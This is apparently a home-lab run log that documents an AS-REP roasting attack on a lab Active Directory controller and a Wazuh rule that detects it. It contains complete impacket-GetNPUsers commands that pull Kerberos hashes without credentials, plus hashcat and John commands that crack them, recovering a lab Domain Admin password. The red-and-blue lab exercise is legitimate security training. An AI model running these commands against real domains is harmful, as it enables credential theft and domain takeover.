# Project 02 — AS-REP Roasting: Run Log

Actual execution record of the attack described in [`README.md`](README.md).
Run on **2026-07-30** from KALI01 (`10.10.10.40`) against DC01 (`10.10.10.10`),
red phase (KALI01 + DC01 up, Wazuh off).

---

## Environment at run time
- **KALI01** — Kali 2026.2, `felix@felix`, eth0 = NAT (`10.0.2.15`, internet),
  eth1 = host-only (`10.10.10.40/24`, static, DNS → `10.10.10.10`).
- **DC01** — `lab.local` DC, `10.10.10.10`, NTDS running, DNS resolving. Reachable
  from Kali over the host-only net.
- Tooling shipped with Kali: `impacket-GetNPUsers`, `john` (krb5asrep format),
  `hashcat v7.1.2`.

## Step 1 — Pull the AS-REP with no credentials

`b.otieno` has `DoesNotRequirePreAuth = True` (misconfig #2), so the DC returns its
AS-REP to an **unauthenticated** request — `-no-pass` sends no credentials at all:

```bash
impacket-GetNPUsers lab.local/b.otieno -dc-ip 10.10.10.10 -no-pass \
    -format hashcat -outputfile asrep.hashes
```

Output ([`evidence/getnpusers_output.txt`](evidence/getnpusers_output.txt)):

```
[*] Getting TGT for b.otieno
$krb5asrep$23$b.otieno@LAB.LOCAL:b2ab3b16...<truncated>
```

The `$23$` = RC4 (etype 0x17). No password was supplied, yet the DC handed over
crackable material — that is the whole point of the misconfiguration.

## Step 2 — Crack the hash offline

The canonical tool is **hashcat mode 18200**:

```bash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

> **Host note:** this VM has no GPU and Kali 2026.2's mirror had no `pocl` (CPU
> OpenCL) package, so hashcat reports `CL_PLATFORM_NOT_FOUND_KHR` (no compute
> backend). I therefore crack with **John the Ripper**, which cracks the identical
> `krb5asrep` hash on CPU with no OpenCL dependency. Same hash, same result. On a
> GPU-equipped host, the hashcat command above is the one to use. (This is the same
> substitution documented for Project 01.)

```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.hashes
john --format=krb5asrep --show asrep.hashes
```

Output ([`evidence/john_output.txt`](evidence/john_output.txt)):

```
$krb5asrep$23$b.otieno@LAB.LOCAL:Password1
1 password hash cracked, 0 left
```

**Recovered credential: `b.otieno : Password1`.**

## Result

Starting from **nothing — no domain credentials at all** — I recovered a domain
user's plaintext password. And `b.otieno` is not just any user: in this lab that
account is also a member of Domain Admins and holds replication rights (it is the
pivot account the DCSync project uses). AS-REP roasting turned an anonymous network
position into Domain-Admin credentials in two commands. That is why pre-auth being
disabled on even one privileged account is a serious finding.

## Blue phase — detection fired (2026-07-30)

With WAZUH01 up and the DC01 Wazuh agent reporting, I re-ran the AS-REP roast live
(all three VMs on: DC01 squeezed to 2 GB + KALI01 + WAZUH01 — the Phase-3
"real-time detection" layout from the operating guide) and the detection worked
end-to-end.

**Setup for this run:**
- Wazuh single-node stack (manager/indexer/dashboard 4.9.0) up on WAZUH01
  (`10.10.10.50`). On boot the manager's `wazuh-db` had stalled under memory
  pressure, taking `remoted`/`analysisd`/`authd` down with it (agents showed
  *Unknown*); a `docker restart` of the manager container brought them back and
  DC01 reconnected as **Active (id 001)**.
- Custom rule **100011** (level 10) loaded, keying on
  `data.win.system.eventID:4768 AND data.win.eventdata.preAuthType:0`.
- DC01 audits *Kerberos Authentication Service* (Success), so the AS-REQ writes
  **Event 4768**.

**Result:** the `impacket-GetNPUsers -no-pass` request from KALI01 (`10.10.10.40`)
produced a **4768 with Pre-Authentication Type 0** on DC01, the agent shipped it, and
rule **100011** matched. In the Wazuh dashboard, filtering `rule.id:100011` returns
the hits (I ran the roast twice, so `firedtimes` = 2) with:

| Field | Value |
|-------|-------|
| rule.id / level | **100011** / 10 |
| rule.description | AS-REP Roasting: AS-REQ with pre-auth disabled (preAuthType 0) [T1558.004] |
| rule.mitre | **T1558.004** (Credential Access → AS-REP Roasting) |
| agent.name | **DC01** (id 001) |
| data.win.system.eventID | **4768** |
| data.win.eventdata.preAuthType | **0** ← the AS-REP-roast signature |
| data.win.eventdata.ticketEncryptionType | **0x17** (RC4) |
| data.win.eventdata.targetUserName / serviceName | **b.otieno** / **krbtgt** |
| data.win.eventdata.ipAddress | ::ffff:**10.10.10.40** (the attacker, KALI01) |

That closes the loop for misconfig #2: the **same finding** is both exploited (red)
and detected (blue). The full alert document is saved at
[`evidence/wazuh_alert_100011.json`](evidence/wazuh_alert_100011.json).

> **Screenshot note:** the dashboard screenshots were taken from Firefox inside the
> KALI01 GNOME (Wayland) session, driven headlessly from the host. The filtered
> `rule.id:100011` result renders the alert with all `data.win.*` fields legible
> inline (05). GNOME's Wayland RemoteDesktop portal re-prompts for consent on every
> *synthetic pointer* click, so the per-row "expand document" click could not be
> automated; the complete field-level detail is captured instead as the raw alert
> JSON (`evidence/wazuh_alert_100011.json`), which is more complete than the
> expanded-row view anyway. Keyboard injection is unaffected — the login, cert
> accept, and query were all driven that way.

## Evidence

**Red phase** — screenshots captured live from the KALI01 GUI terminal (2026-07-30):

Captured full-screen so the whole command chain is legible in one frame:

| # | Shot | What it shows |
|---|------|---------------|
| 1 | [`evidence/01-kali-reaches-dc.png`](evidence/01-kali-reaches-dc.png) | Kali on `10.10.10.40` reaching DC01 (ping, 0% loss) |
| 2 | [`evidence/02-getnpusers-asrep.png`](evidence/02-getnpusers-asrep.png) | `impacket-GetNPUsers -no-pass` pulling `b.otieno`'s AS-REP with no credentials |
| 3 | [`evidence/03-john-cracks-password.png`](evidence/03-john-cracks-password.png) | John cracking the AS-REP → **`b.otieno : Password1`** |
| 4 | [`evidence/04-full-chain.png`](evidence/04-full-chain.png) | The full chain end to end in one maximized terminal: reach → roast → crack → `--show` |

**Blue phase** — screenshot from the Wazuh dashboard (Firefox in the KALI01 session),
2026-07-30:

| # | Shot | What it shows |
|---|------|---------------|
| 5 | [`evidence/05-wazuh-asrep-alert.png`](evidence/05-wazuh-asrep-alert.png) | Discover filtered to `rule.id:100011` — **2 hits** from DC01, showing 4768 / preAuthType 0 / RC4 (0x17) / `b.otieno` / krbtgt, source `::ffff:10.10.10.40` inline |

Raw command output & alert data:
- [`evidence/getnpusers_output.txt`](evidence/getnpusers_output.txt) — AS-REP hash pulled with no password
- [`evidence/john_output.txt`](evidence/john_output.txt) — offline crack recovering `Password1`
- [`evidence/wazuh_alert_100011.json`](evidence/wazuh_alert_100011.json) — the full Wazuh alert document (every `data.win.*` field)
